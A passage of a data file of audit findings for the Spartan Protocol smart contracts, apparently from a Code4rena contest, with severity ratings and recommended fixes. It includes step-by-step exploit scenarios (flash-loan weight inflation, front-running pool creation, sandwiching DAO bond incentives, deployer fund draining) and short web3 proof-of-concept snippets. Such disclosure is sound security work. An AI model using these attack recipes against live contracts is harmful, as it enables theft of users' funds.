    base.functions.transfer(token_pool.address, transfer_amount).transact()
    token_pool.functions.mintSynth(token_synth.address, user).transact()
```

The Pool was initialized with 10000:10000 in both cases. While the first case(swap token) gets `4744.4059` and the second case gets `6223.758`.


The debt should be considered in the AMM pool so I recommend to maintain a debt variable in the Pool and use `tokenAmount - debt` when the Pool calculates the token price. Here's some idea of it:
```solidity
uint256 public debt;
function _tokenAmount() returns (uint256) {
    return tokenAmount - debt;
}

// Swap SPARTA for Synths
function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {
    require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, ""!synth""); // Must be a valid Synth
    uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount

    // Use tokenAmount - debt to calculate the value
    uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, _tokenAmount()); // Calculate value of swapping SPARTA to the relevant underlying TOKEN

    // increment the debt
    debt += output

    uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted
    _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount
    uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN
    fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA
    _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold
    iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user
    _addPoolMetrics(fee); // Add slip fee to the revenue metrics
    emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);
    return (output, fee);
}
```"
20.md,wrong `calcLiquidityHoldings` that leads to dead fund in the Pool,high,"The lptoken minted by the `Pool` contract is actually the mix of two types of tokens. One is the original lptokens user get by calling `addForMember`. This lpToken is similar to lp of Uniswap, Crv, Sushi, ... etc. The other one is the debt-lp token the Synth contract will get when the user calls `mintSynth`. The `Synth` contract can only withdraw `Sparta` for burning debt-lp. Mixing two types of lp would raise several issues.

LP user would not get their fair share when they burn the lP.
1. Alice adds liquidity with Sparta 1000 and token B 1000 and create a new Pool.
2. Bob mint Synth with 1000 Sparta and get debt.
3. Alice withdraw all lp Token
4. Bob burn all Synth.

The pool would end up left behind a lot of token B in the Pool while there's no lp holder.

I would say this is a high-risk vulnerability since it pauses unspoken risks and losses for all users (all the time)

The logic of [burn original lp](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L192-L202) and [burn debt-lp](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L244-L257).

I do not know whether this is the team's design choice or its composite with a series of bugs. If this is the original design, I do not come up with a fix. It's a bit similar to the impermanent loss. However, the loss would be left behind in the Pool. This is more complicated and maybe worse than the impermanent loss. If this is the design choice, I think it's worth emphasize and explain to the users."
20.md,Flash loan manipulation on `getPoolShareWeight` of `Utils`,high,"The `getPoolShareWeight` function returns a user's pool share weight by calculating how many SPARTAN the user's LP tokens account for. However, this approach is vulnerable to flash loan manipulation since an attacker can swap a large number of TOKEN to SPARTAN to increase the number of SPARTAN in the pool, thus effectively increasing his pool share weight.

According to the implementation of `getPoolShareWeight,` a user's pool share weight is calculated by `uints * baseAmount / totalSupply`, where `uints` is the number of user's LP tokens, `totalSupply` is the total supply of LP tokens, and `baseAmount` is the number of SPARTAN in the pool. Thus, a user's pool share weight is proportional to the number of SPARTAN in the pool. Consider the following attack scenario:

1. Supposing the attacked pool is SPARTAN-WBNB. The attacker first prepares some LP tokens (WBNB-SPP) by adding liquidity to the pool.
2. The attacker then swaps a large number of WBNB to SPARTAN, which increases the pool's `baseAmount`. He could split his trade into small amounts to reduce slip-based fees.
3. The attacker now wants to increase his weight in the `DaoVault`. He adds his LP tokens to the pool by calling the `deposit` function of `Dao.`
4. `Dao` then calls `depositLP` of `DaoVault`, causing the attacker's weight to be recalculated. Due to the large proportion of SPARTAN in the pool, the attacker's weight is artificially increased.
5. With a higher member weight, the attacker can, for example, vote the current proposal with more votes than he should have or obtain more rewards when calling `harvest` of the `Dao` contract.
6. The attacker then swaps back SPARTAN to WBNB and only loses the slip-based fees.

Referenced code:
[Utils.sol#L46-L50](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L46-L50),
[Utils.sol#L70-L77](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L70-L77),
[DaoVault.sol#L44-L56](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/DaoVault.sol#L44-L56),
[Dao.sol#L201](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L201), and
[Dao.sol#L570](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L570).

A possible mitigation is to record the current timestamp when a user's weight in the `DaoVault` or `BondVault` is recalculated and force the new weight to take effect only after a certain period, e.g., a block time. This would prevent the attacker from launching the attack since there is typically no guarantee that he could arbitrage the WBNB back in the next block."
20.md,`Dao.sol`: Insufficient validation for proposal creation,medium,"In general, creating invalid proposals is easy due to the lack of validation in the `new*Proposal()` functions.

- The `typeStr` is not validated at all. For example, one can call `newActionProposal()` with `typeStr = ROUTER` or `typeStr = BAD_STRING`, both of which will pass. The first will cause `finaliseProposal()` to fail because the proposed address is null, preventing `completeProposal()` from executing. The second does nothing because it does not equate to any of the check `typeStr`, and so `completeProposal()` isn't executed at all.
- Not checking the proposed values are null. The checks only happen in `finaliseProposal()` when the relevant sub-functions are called, like the `move*()` functions.

All of these scenarios lead to a mandatory 15 day wait since proposal creation in order to be cancelled, which prevents the creation of new proposals (in order words, denial of service of the DAO).

**Recommended Steps**:
1. Since the number of proposal types is finite, it is best to restrict and validate the `typeStr` submitted. Specifically,
    - `newActionProposal()` should only allow `FLIP_EMISSIONS` and `GET_SPARTA` proposal types
    - `newAddressProposal()` should only allow `DAO`, `ROUTER`, `UTILS`, `RESERVE`, `LIST_BOND`, `DELIST_BOND`, `ADD_CURATED_POOL` and  `REMOVE_CURATED_POOL` proposal types
    - `newParamProposal()` should only allow `COOL_OFF` and `ERAS_TO_EARN` proposal types
2. Perhaps have a ""catch-all-else"" proposal that will only call `_completeProposal()` in `finaliseProposal()`

```jsx
function finaliseProposal() external {
	...
	} else if (isEqual(_type, 'ADD_CURATED_POOL')){
		_addCuratedPool(currentProposal);
  } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){
    _removeCuratedPool(currentProposal);
  } else {
		completeProposal(_proposalID);
	}
```

3. Do null validation checks in `newAddressProposal()` and `newParamProposal()`

```jsx
function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {
    require(proposedAddress != address(0), ""!address"");
		// TODO: validate typeStr
		...
}

function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {
    require(param != 0, ""!param"");
		// TODO: validate typeStr
		...
}
```"
20.md,Missleading `onlyDAO` modifiers,medium,"Several contracts implement an `onlyDAO` modifier which, as the name suggests, should only authorize the function to be executed by the DAO.
However, some implementations are wrong and either allow the DAO or the deployer to execute, or even only the deployer:

Incorrect implementations:
- `BondVault.onlyDAO`: allows deployer + DAO
- `DAO.onlyDAO`: allows deployer
- `DAOVault.onlyDAO`: allows deployer + DAO
- `poolFactory.onlyDAO`: allows deployer + DAO
- `Router.onlyDAO`: allows deployer + DAO
- `Synth.onlyDAO`: allows deployer
- `synthFactory.onlyDAO`: allows deployer
- `synthVault.onlyDAO`: allows deployer + DAO

In all of these functions, the deployer may execute the function as well which is a centralization risk.
The deployer can only sometimes be purged, as in `synthFactory`, in which case nobody can execute these functions anymore.

Recommend renaming it to `onlyDeployer` or `onlyDeployerOrDAO` depending on who has access."
20.md,Improper access control of `claimAllForMember` allows anyone to reduce the weight of a member,medium,"The `claimAllForMember` function of `Dao` is permissionless, allowing anyone to claim the unlocked bonded LP tokens for any member. However, claiming a member's LP tokens could decrease the member's weight in the `BondVault`, thus affecting the member's votes and rewards in the `Dao` contract.

For example, an attacker can intentionally front-run a victim's `voteProposal` call to decrease the victim's vote weight to prevent the proposal from being finalized:

1. Supposing the victim's member weight in the `BondVault` is 201, the total weight is 300. The victim has some LP tokens claimable from the vault, and if claimed, the victim's weight will be decreased to 101. To simplify the situation, assuming that the victim's weight in the `DaoVault` and the total weight of the `DaoVault` are both 0.
2. The victim wants to vote on the current proposal, which requires the majority consensus. If the victim calls `voteProposal`, the proposal will be finalized since the victim has the majority weight (201/300 > 66.6%).
3. An attacker does not want the proposal to be finalized, so he calls `claimAllForMember` with the victim as the parameter to intentionally decrease the victim's weight.
4. As a result, the victim's weight is decreased to 101, and the total weight is decreased to 200. The victim cannot finalize the proposal since he has no majority anymore (101/200 < 66.6%).

Similarly, an attacker can front-run a victim's `harvest` call to intentionally decrease the victim's reward since the amount of reward is calculated based on the victim's current weight.

See issue page page for referenced code

Consider removing the `member` parameter in the `claimAllForMember` function and replace all `member` to `msg.sender` to allow only the user himself to claim unlocked bonded LP tokens."
20.md,_deposit resetting user rewards can be used to grief them and make them loose rewards via `depositForMember`,medium,"The function `_deposit` sets `mapMemberSynth_lastTime` to a date in the future in `synthVault.sol` [L107](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107).

`mapMemberSynth_lastTime` is also used to calculate rewards earned. `depositForMember` allows anyone, to ""make a donation"" for the member and cause that member to lose all their accrued rewards. This can't be used for personal gain, but can be used to bring misery to others.

`depositForMember` (in `synthVault.sol` on [L95](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L95) can be called by anyone.

This will set the member and can be continuously exploited to make members never earn any reward.
```solidity
 mapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member -> synth)
```

This is the [second submission](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107) under the same exploit.

This can be mitigated by harvesting for the user right before changing `mapMemberSynth_lastTime[_member][_synth]`"
20.md,Pools can be created without initial liquidity,medium,"The protocol differentiates between public pool creations and private ones (starting without liquidity). However, this is not effective as anyone can just flashloan the required initial pool liquidity, call `PoolFactory.createPoolADD`, receive the LP tokens in `addForMember` and withdraw liquidity again.

Recommend considering burning some initial LP tokens or taking a pool creation fee instead."
20.md,Pool: `approveAndCall` sets unnecessary approval,medium,"The `Pool.approveAndCall` function approves the `recipient` contract with the max value instead of only the required `amount`.

For safety, the approval should not be set to the max value, especially if the amount that the contract may use is already known in this call, like this is the case for `approveAndCall`.

Recommend only approving `amount`."
20.md,Synth: `approveAndCall` sets unnecessary approval,medium,"The `Synth.approveAndCall` function approves the `recipient` contract with the max value instead of only the required `amount`.

For safety, the approval should not be set to the max value, especially if the amount that the contract may use is already known in this call, like this is the case for `approveAndCall`.

Recommend only approving `amount`."
20.md,`SynthVault` deposit lockup bypass,medium,"The `SynthVault.harvestSingle` function can be used to mint & deposit synths without using a lockup. An attacker sends `BASE` tokens to the pool and then calls `harvestSingle`. The inner `iPOOL(_poolOUT).mintSynth(synth, address(this));` call will mint synth tokens to the vault based on the total `BASE` balance sent to the pool, including the attacker's previous transfer.
They are then credited the entire amount to their `weight`.

This essentially acts as a (mint +) deposit without a lock-up period.

Recommend syncing the pool before sending `BASE` to it through `iRESERVE(_DAO().RESERVE()).grantFunds(reward, _poolOUT);` such that any previous `BASE` transfer is wasted. This way only the actual reward's weight is increased."
20.md,In the beginning its relatively easy to gain majority share,medium,"When the DAO is just deployed it is relatively easy to gain a large (majority) share, by depositing a lot in the `DAOVault` and/of `BONDVault`. Then you could submit a proposal and vote it in. Luckily there is a `coolOffPeriod` of 3 days.
But if others are not paying attention in these 3 days you might get your vote passed by voting for it with your majority share.
The riskiest proposal would be to replace the DAO (moveDao), because that way you could take over everything.

Recommend pay attention to the proposals when the DAO is just deployed In [Dao.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol) and making sure you initially have a majority vote."
20.md,`grantFunds` will revert after a DAO upgrade.,medium,"When the DAO is upgraded via `moveDao`, it also updates the DAO address in BASE. However it doesn't update the DAO address in the `Reserve.sol` contract. This could be done with the function `setIncentiveAddresses(..)`

Now the next time `grantFunds` of `DAO.sol` is called, its tries to call `_RESERVE.grantFunds(...)`

The `grantFunds` of `Reserve.sol` has the modifier `onlyGrantor()`, which checks the msg`.sender` == DAO.
However in the mean time, the DAO has been updated and `Reserve.sol` doesn't know about it and thus the modifier will not allow access to the function. Thus `grantFunds` will revert.

`Dao.sol` [L452](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L452)
```solidity
function moveDao(uint _proposalID) internal {
    address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address
    require(_proposedAddress != address(0), ""!address""); // Proposed address must be valid
    DAO = _proposedAddress; // Change the DAO to point to the new DAO address
    iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address
    daoHasMoved = true; // Set status of this old DAO
    completeProposal(_proposalID); // Finalise the proposal
}

function grantFunds(uint _proposalID) internal {
    uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount
    address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient
    require(_proposedAmount != 0, ""!param""); // Proposed grant amount must be valid
    require(_proposedAddress != address(0), ""!address""); // Proposed recipient must be valid
    _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient
    completeProposal(_proposalID); // Finalise the proposal
}
```
`Reserve.sol` [L17](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/outside-scope/Reserve.sol#L17)
```solidity
modifier onlyGrantor() {
    require(msg.sender == DAO || msg.sender == ROUTER || msg.sender == DEPLOYER || msg.sender == LEND || msg.sender == SYNTHVAULT, ""!DAO"");
    _;
}

function grantFunds(uint amount, address to) external onlyGrantor {
    ....
}

function setIncentiveAddresses(address _router, address _lend, address _synthVault, address _Dao) external onlyGrantor {
    ROUTER = _router;
    LEND = _lend;
    SYNTHVAULT = _synthVault;
    DAO = _Dao;
}
```
Recommend calling `setIncentiveAddresses(..)` when a DAO upgrade is done."
20.md,Block usage of `addCuratedPool`,medium,"The function `curatedPoolCount()` contains a for loop over the array `arrayPools`. If `arrayPools` would be too big then the loop would run out of gas and `curatedPoolCount()` would revert. This would mean that `addCuratedPool()` cannot be executed anymore (because it calls `curatedPoolCount()` )

The array `arrayPools` can be increased in size arbitrarily by repeatedly doing the following:
- create a pool with `createPoolADD()`  (which requires 10,000 SPARTA)
- empty the pool with `remove()` of Pool.sol, which gives back the SPARTA tokens
These actions will use gas to perform.


```solidity
// https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L45
function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){
    require(getPool(token) == address(0)); // Must be a valid token
    require((inputToken > 0 && inputBase >= (10000*10**18)), ""!min""); // User must add at least 10,000 SPARTA liquidity & ratio must be finite
    Pool newPool; address _token = token;
    if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB
    require(_token != BASE && iBEP20(_token).decimals() == 18); // Token must not be SPARTA & it's decimals must be 18
    newPool = new Pool(BASE, _token); // Deploy new pool
    pool = address(newPool); // Get address of new pool
    mapToken_Pool[_token] = pool; // Record the new pool address in PoolFactory
    _handleTransferIn(BASE, inputBase, pool); // Transfer SPARTA liquidity to new pool
    _handleTransferIn(token, inputToken, pool); // Transfer TOKEN liquidity to new pool
    arrayPools.push(pool); // Add pool address to the pool array
    ..

function curatedPoolCount() internal view returns (uint){
    uint cPoolCount;
    for(uint i = 0; i< arrayPools.length; i++){
        if(isCuratedPool[arrayPools[i]] == true){
            cPoolCount += 1;
        }
    }
    return cPoolCount;
}
```

```solidity
function addCuratedPool(address token) external onlyDAO {
    ...
    require(curatedPoolCount() < curatedPoolSize, ""maxCurated""); // Must be room in the Curated list
```


```solidity
// https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L187
function remove() external returns (uint outputBase, uint outputToken) {
    return removeForMember(msg.sender);
}

// Contract removes liquidity for the user
function removeForMember(address member) public returns (uint outputBase, uint outputToken) {
    uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount
    outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units
    outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units
    _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts
    _burn(address(this), _actualInputUnits); // Burn the LP tokens
    iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user
    iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user
    emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);
    return (outputBase, outputToken);
}
```
Recommend creating a variable `curatedPoolCount` and increase it in `addCuratedPool` and decrease it in `removeCuratedPool`."
20.md,`BondVault.sol`: Possibly unwithdrawable bondedLP funds in `claimForMember()` + `claimRate` never zeros after full withdrawals,medium,"A host of problems arise from the L110-113 of the `claimForMember()` function, where `_claimable` is deducted from the bondedLP balance before the condition check, when it should be performed after (or the condition is changed to checking if the remaining bondedLP balance to zero).

```jsx
// L110 - L113
mapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder
if(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){
	mapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate
}
```
**1. Permanently Locked Funds**

If a user claims his bonded LP asset by calling `dao.claimForMember()`, or a malicious attacker helps a user to claim by calling `dao.claimAllForMember()`, either which is done such that `_claimable` is exactly half of his remaining bondedLP funds of an asset, then the other half would be permanently locked.

- Assume `mapBondAsset_memberDetails[asset].bondedLP[member] = 2 * _claimable`
- L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = _claimable`
- L111: The if condition is satisfied
- L112: User's claimRate is erroneously set to 0 ⇒ `calcBondedLP()` will return 0, ie. funds are locked permanently

**2. Claim Rate Never Zeroes For Final Claim**

On the flip side, should a user perform a claim that enables him to perform a full withdrawal (ie. `_claimable` = `mapBondAsset_memberDetails[asset].bondedLP[member]`, we see the following effects:

- L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = 0`
- L111: The if condition is not satisfied, L112 does not execute, so the member's claimRate for the asset remains non-zero (it is expected to have been set to zero).

Thankfully, subsequent behavior remains as expected since `calcBondedLP` returns zero as `claimAmount` is set to the member's bondedLP balance (which is zero after a full withdrawal).

The `_claimable` deduction should occur after the condition check. Alternatively, change the condition check to `if (mapBondAsset_memberDetails[asset].bondedLP[member] == 0)`."
20.md,Vulnerable Pool initial rate.,medium,"`Pool` is created in function `createPoolADD`. The price (rate) of the token is determined in this function. Since the address is deterministic, the attacker can front-run the `createPoolADD` transaction and sends tokens to Pool's address. This would make the pool start with an extreme price and create a huge arbitrage space.

I assume pools would be created by the deployer rather than DAO at the early stage of the protocol.
If the deployer calls `createPoolADD` and `addCuratedPool` at the same time then an attacker/arbitrager could actually get (huge) profit by doing this.

Assume that the deployer wants to create a BNB pool at an initial rate of 10000:300 and then make it a curated pool.
An arbitrager can send 2700 BNB to the (precomputed) pool address and make iBNB 10x cheaper. The arbitrager can mint the synth at a 10x cheaper price before the price becomes normal.

`poolFactory.sol` [L45-L62](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L45-L62)
```solidity
pre_computed_dai_pool_address = '0x1007BDBA1BCc3C94e20d57768EF9fc0b1Cc2844b'
dai.functions.transfer(pre_computed_dai_pool_address, initial_amount*10).transact({'from': w3.eth.accounts[1]})
initial_amount = 10000*10**18
dai.functions.approve(pool_factory.address, initial_amount*10).transact()
base.functions.approve(pool_factory.address, initial_amount).transact()
pool_factory.functions.createPoolADD(initial_amount, initial_amount, dai.address).transact()
```

Recommend adding:
```solidity
 require(iBEP20(BASE).balanceOf(address(pool)) == 0 && iBEP20(token).balanceOf(address(pool)) == 0, ""initial balance should be zero"");
```
In `createPoolADD`"
20.md,BondVault `BASE` incentive can be gamed,medium,"`BondVault` deposits match _any_ deposited `token` amount with the `BASE` amount to provide liquidity, see [Docs](https://docs.spartanprotocol.org/tokenomics-1/sparta) and `DAO.handleTransferIn`.
The matched `BASE` amount is the **swap amount** of the `token` trade in the pool.
An attacker can manipulate the pool and have the `DAO` commit `BASE` at bad prices which they then later buys back to receive a profit on `BASE`. This is essentially a sandwich attack abusing the fact that one can trigger the `DAO` to provide `BASE` liquidity at bad prices:

1. Manipulate the pool spot price by dripping a lot of `BASE` into it repeatedly (sending lots of smaller trades is less costly due to the [path-independence of the continuous liquidity model](https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the `token` per `BASE` price.
2. Repeatedly call `DAO.bond(amount)` to drip `tokens` into the `DAO` and get matched with `BASE` tokens to provide liquidity. (Again, sending lots of smaller trades is less costly.) As the pool contains low `token` but high `BASE` reserves, the `spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount)` swap value will be high. **The contract sends even more BASE to the pool to provide this liquidity**.
3. Unmanipulate the pool by sending back the `tokens` from 1. As a lot more `BASE` tokens are in the reserve now due to the DAO sending it, the attacker will receive more `BASE` as in 1. as well, making a profit

The DAO's Bond allocation can be stolen.
The cost of the attack is the trade fees in 1. + 3. as well as the tokens used in 2. to match the `BASE`, but the profit is a share on the `BASE` supplied to the pool by the DAO in 2.

Track a TWAP spot price of the `TOKEN <> BASE` pair and check if the `BASE` incentive is within a range of the TWAP. This circumvents that the `DAO` commits `BASE` at bad prices."
20.md,`DEPLOYER` can drain DAOVault funds + manipulate proposal results,medium,"2 conditions enable the `DEPLOYER` to drain the funds in the `DAOVault`.

- `DAOVault` is missing `purgeDeployer()` function
- `onlyDAO()` is callable by both the `DAO` and the `DEPLOYER`

The `DEPLOYER` can, at any time, call `depositLP()` to increase the LP funds of any account, then call `withdraw()` to withdraw the entire balance.

The only good use case for the `DEPLOYER` here is to help perform emergency withdrawals for users. However, this could use a separate modifier, like `onlyDeployer()`.

1. `DEPLOYER` calls `depositLP()` with any arbitrary amount (maybe DAOVault's pool LP balance - Alice's deposited LP balance) for Alice and pool to increase their weight and balance.
2. At this point, Alice may vote for a proposal to swing it in her favour, or remove it otherwise (to implicitly vote against it)
3. `DEPLOYER` calls `withdraw()` for the Alice, which removes 100% of her balance (and therefore, the entire DAOVault's pool balance)

- Create a separate role and modifier for the `DEPLOYER`, so that he is only able to call `withdraw()` but not `depositLP()`
- Include the missing `purgeDeployer()` function."
20.md,Event log poisoning by griefing attackers,low,"Event log poisoning is possible by griefing attackers who have no DAO weight but vote and emit event that takes up event log space. See [L382](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/) and [L393](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L393) in `Dao.sol`.

Recommend emitting event only if non-zero weight as relevant to proposal voting/cancelling."
20.md,Attackers can grief voting by removing votes just before finalization,low,"Attackers, i.e. malicious DAO members, can grief voting by removing their votes just before finalization and if that takes it below quorum, it forces others to vote and restarts another cooloff period of 3 days. This will delay the finalisation of targeted proposals and the griefing attackers lose nothing in penalty. See issue page for referenced code.

**Recommend**:
1. Redesign to allow vote removal only within a certain window after voting and locking it thereafter.
2. Removal of votes should have an associated penalty"
20.md,Pool.sol: `swapTo()` should not be payable,low,"The `swapTo()` function should not be payable since the WBNB-SPARTA pool should not receive BNB, but WBNB. The router swap functions handles the wrapping and unwrapping of BNB.

Furthermore, the `swapTo()` will not detect any deposited BNB, so any `swapTo()` calls that have msg.value > 0 will have their BNB permanently locked in the pool contract.


Recommend removing `payable` keyword in `swapTo()`."
20.md,Incorrect event parameter used in emit,low,"Incorrect event parameter `outputAmount` is used (instead of output) in the MintSynth event emit. `outputAmount` is a named return variable that is never set in this function and so will always be 0. This should instead be output. This will confuse the UI or offchain monitoring tools that 0 synths were minted and will lead to users panicking/complaining or trying to mint synth again.


Recommend replacing `outputAmount` with output in the emit."
20.md,Missing check for `toPool != fromPool`,low,"`zapLiquidity()` used to trade LP tokens of one pool to another is missing a check for toPool != fromPool which may happen accidentally. The check will prevent unnecessary transfers and avoid any fees/slippage or accounting errors.

Recommend adding `toPool` != `fromPool` as part of input validation."
20.md,Unnecessary redundant check for `basisPoints`,low,"The threshold check for `basisPoints` while a required part of input validation is an unnecessary redundant check because `calcPart()` does a similar upper bound check and the lower bound check on 0 is only an optimization.

Recommend removing redundant check to save gas and improve readability/maintainability."
20.md,Missing `isListedPool` checks may lead to lock/loss of user funds,low,"This `isListedPool` check implemented by `isPool()` is missing in many functions of the contract that accept pool/token addresses from users. `getPool()` returns the default mapping value of 0 for token that do not have valid pools. This lack of input validation may lead to use of zero/invalid pool addresses in the protocol context and reverts in the best case or burn/loss of user funds in the worst case.

Recommend combine `isPool()` `isListedPool` check to `getPool()` so that it always returns a valid/listed pool in the protocol."
20.md,Number of curated pools can only be 10 at any point,low,"Without a setter for curatedPoolSize, the number of curated pools at any point can only be a max of 10 forever, and will require removing one to accommodate another one. It is unclear if this is intentional and a requirement of the protocol.

Recommend a setter for `curatedPoolSize` that allows DAO to increase it if/when required. If not, document the hardcoded limit of curated pools number."
20.md,Incorrect event parameter logs zero address instead of WBNB,low,"The token argument used in `CreatePool` event emit of `createPoolADD()` should really be _token so that WBNB address is logged in the event instead of zero address when token == 0. Logging a zero address could confuse off-chain user interfaces because it is treated as a burn address by convention.

Recommend using _token instead of token in event emit."
20.md,Missing check for already curated pool being re-curated,low,"`addCuratedPool()` is missing a `require(isCuratedPool[_pool] == false)` check, similar to the one in `removeCuratedPool` to ensure that the DAO is not trying to curate an already curated pool which indicates a mismatch of assumption/accounting compared to the contract state.


Recommend adding `require(isCuratedPool[_pool] == false)` before setting `isCuratedPool[_pool]` = true."
20.md,Inconsistent value of `burnSynth` between Pool and Synth,low,"When users try to born synth, the fee and the value of Sparta is calculated at contract `Pool` while the logic of burning `Pool`s Lp and Synth is located at `Synth` contract.

Users can send synth to the `Synth` contract directly and trigger `burnSynth` at the `Pool` contract. The Pool would not send any token out while the `Synth` contract would burn the lp and Synth.
While users can not drain the liquidity by doing this, breaking the AMM rate unexpectedly is may lead to troubles.  The calculation of debt and the fee would end up with a wrong answer.

Pool's `burnSynth` and Synth's `burnSynth` are tightly coupled functions. In fact, according to the current logic, `Synth:burnSynth` should only be triggered from a valid `Pool` contract.

IMHO, applying the`Money in - Money Out` model in the `Synth` contract does more harm than good to the readability and security of the protocol. Consider to let `Pool` contract pass the parameters to the `Synth` contract and add a require check in the `Synth` contract.

[L-12] [`synthVault.sol`: `_processWithdraw`: Replace `synthReward` with principle](https://github.com/code-423n4/2021-07-spartan-findings/issues/45)"
20.md,Missing zero-address checks in constructors and setters,low,"Checking addresses against zero-address during initialization or during setting is a security best-practice. However, such checks are missing in address variable initializations/changes in many places. Given that zero-address is used as an indicator for BNB, there is a greater risk of using it accidentally.

Allowing zero-addresses will lead to contract reverts and force redeployments if there are no setters for such address variables.

Recommend adding zero-address checks for all initializations/setters of all address state variables."
20.md,Mismatch in event definition,low,"In synthFactory.sol, there's an `event CreateSynth(address indexed token, address indexed pool)`. However the event is emitted with ""synth"" as second output.

Recommend thinking about what's the better variable to be emitted, and correct one of the lines."
20.md,Missing revert if denominator = 0,low,"In [Synth.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Synth.sol#L176), the function `burnSynth()` calculates a division between two variables. Since they can be zero, it's better to have a require with a clear error message when the division is not possible, otherwise an user wouldn't know why a transaction reverted.

Recommend adding a `require(denom != 0, ""LPDebt = 0"")`."
20.md,Missing input validation `zapLiquidity()`,low,"`zapLiquidity()` in [Router.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L59) misses an input validation unitsInput > 0.

Recommend adding an input validation for `unitsInput`."
20.md,Loss of precision,low,"In [Router.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L274), there's a loss of precision that can be corrected by shifting the operations.

Consider rewriting L274-275 with `uint numerator = (_fees * reserve) / eraLength / maxTrades;`."
20.md,Missing input validation in `addLiquidityForMember()`,low,"In [Router.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L51), the function `addLiquidityForMember()` doesn't check inputBase and `inputToken`. Since we know they can't both be zero (it wouldn't change anything and user pays the gas for nothing).

Recommend considering adding a require `inputBase>0 || inputToken>0`."
20.md,Dao.sol: Unbounded Iterations in `claimAllForMember()`,low,"The `claimAllForMember()` function iterates through the full list of `listedAssets`. Should `listedAssets` become too large, as more assets are listed, calling this function will run out of gas and fail.

A good compromise would be to take in an array of asset indexes, so that users can claim for multiple assets in multiple parts.

```jsx
function claimAllForMember(address member, uint256[] calldata assetIndexes)  external returns (bool){
    address [] memory listedAssets = listedBondAssets; // Get array of bond assets
    for(uint i = 0; i < assetIndexes.length; i++){
        uint claimA = calcClaimBondedLP(member, listedAssets[assetIndexes[i]]); // Check user's unlocked Bonded LPs for each asset
        if(claimA > 0){
            _BONDVAULT.claimForMember(listedAssets[assetIndexes[i]], member); // Claim LPs if any unlocked
        }
    }
    return true;
}
```"
20.md,Missing parameter validation,low,"Some parameters of functions are not checked for invalid values:
- `PoolFactory.constructor`: Validate `_base` and `_wbnb` to be contracts or at least non-zero

